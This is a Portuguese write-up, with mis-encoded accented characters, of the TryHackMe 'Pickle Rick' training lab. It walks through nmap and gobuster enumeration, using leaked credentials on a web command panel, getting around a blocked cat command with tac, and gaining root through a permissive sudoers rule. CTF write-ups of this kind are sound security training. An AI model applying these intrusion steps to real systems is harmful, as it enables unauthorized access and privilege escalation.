TryHackMe - Pickle Rick ü•í
üéØ Objetivo do Desafio

O desafio Pickle Rick do TryHackMe tem como finalidade simular um ambiente web vulner√°vel, no qual o atacante deve:

    1- Enumerar servi√ßos e diret√≥rios expostos.

    2- Identificar credenciais escondidas em ficheiros.

    3- Obter acesso a um painel remoto com execu√ß√£o de comandos.

    4- Explorar o sistema para recolher ficheiros com chaves secretas.

    5- Escalar privil√©gios para utilizador root, demonstrando explora√ß√£o de m√°s configura√ß√µes no sistema.

Este tipo de desafio √© altamente relevante em pentesting e auditorias de seguran√ßa, pois reproduz cen√°rios comuns em ambientes reais.

üîç 1. Enumera√ß√£o Inicial
    Inspe√ß√£o do c√≥digo-fonte

    Na p√°gina inicial, ao verificar o View Page Source, encontrei uma nota com o seguinte conte√∫do:

    Note to self, remember username!
    Username: R1ckRul3s


‚û°Ô∏è Identifica√ß√£o de poss√≠vel nome de utilizador v√°lido.

    Varredura de portas com Nmap
    nmap -sV -p 80,443 10.10.173.79

    Resultado:

    80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
    443/tcp closed https

‚û°Ô∏è O servi√ßo web estava ativo apenas em HTTP (porta 80).

    Enumera√ß√£o de diret√≥rios com Gobuster
    gobuster dir -u http://10.10.173.79/ -w /usr/share/dirb/wordlists/common.txt -x html,php,txt

    Descobertas importantes:

    /robots.txt ‚Üí cont√©m a string Wubbalubbadubdub (prov√°vel password).

    /portal.php ‚Üí redireciona para /login.php (sistema de autentica√ß√£o).

    /assets/ ‚Üí diret√≥rio acess√≠vel mas sem ficheiros cr√≠ticos.

‚û°Ô∏è Nesta fase, obtive tanto username quanto password, fundamentais para acesso ao sistema.

üîë 2. Acesso ao Portal

    Username: R1ckRul3s

    Password: Wubbalubbadubdub

Com estas credenciais, foi poss√≠vel aceder ao /portal.php, que fornecia um painel de execu√ß√£o remota de comandos (Command Panel).

‚û°Ô∏è Esta funcionalidade √© uma vulnerabilidade cr√≠tica, permitindo intera√ß√£o direta com o sistema.

üõ†Ô∏è 3. Explora√ß√£o e Coleta de Chaves
    Primeira Chave

    Comandos executados:

    ls
    cat Sup3rS3cretPickl3Ingred.txt


    Resultado:

    Ingrediente 1 ‚Üí mr. meeseek hair

    Segunda Chave

    Explora√ß√£o do diret√≥rio /home/rick/:

    ls -l /home/rick


    Encontrado o ficheiro second ingredients.

    O comando cat estava desativado, ent√£o utilizei tac:

    tac /home/rick/second\ ingredients


    Resultado:

        Ingrediente 2 ‚Üí 1 jerry tear

‚û°Ô∏è Importante notar que a barra invertida () foi necess√°ria para lidar com o espa√ßo no nome do ficheiro.

    Terceira Chave (Escalada de Privil√©gios)

    Verifica√ß√£o de permiss√µes sudo:

    sudo -l


    Sa√≠da:

    O utilizador www-data podia executar qualquer comando como root sem senha.

    ‚û°Ô∏è Esta √© uma falha grave de configura√ß√£o no /etc/sudoers, permitindo privilege escalation imediato.

    Listando diret√≥rios de root:

    sudo ls -al /root/


    Identificado o ficheiro 3rd.txt.

    Leitura do conte√∫do:

    sudo tac /root/3rd.txt


    Resultado:

        Ingrediente 3 ‚Üí fleeb juice

üìå 4. Conclus√£o

    O desafio foi conclu√≠do com sucesso, demonstrando a aplica√ß√£o pr√°tica das seguintes t√©cnicas:

    Enumera√ß√£o Web: utiliza√ß√£o de view-source, nmap e gobuster para descobrir utilizadores, passwords e ficheiros escondidos.

    Exploitation: acesso ao painel de execu√ß√£o de comandos que permitiu intera√ß√£o direta com o sistema.

    Privilege Escalation: explora√ß√£o de m√° configura√ß√£o no sudoers, obtendo acesso root sem necessidade de password.

    Ingredientes finais encontrados:

        mr. meeseek hair

        1 jerry tear

        fleeb juice

üß© Relev√¢ncia

    Este exerc√≠cio refor√ßou compet√™ncias essenciais em ciberseguran√ßa e pentesting:

    Import√¢ncia da enumera√ß√£o sistem√°tica em aplica√ß√µes web.

    Explora√ß√£o pr√°tica de credenciais expostas e pain√©is vulner√°veis.

    Impacto de configura√ß√µes incorretas em permiss√µes de sudo, um erro ainda recorrente em sistemas reais.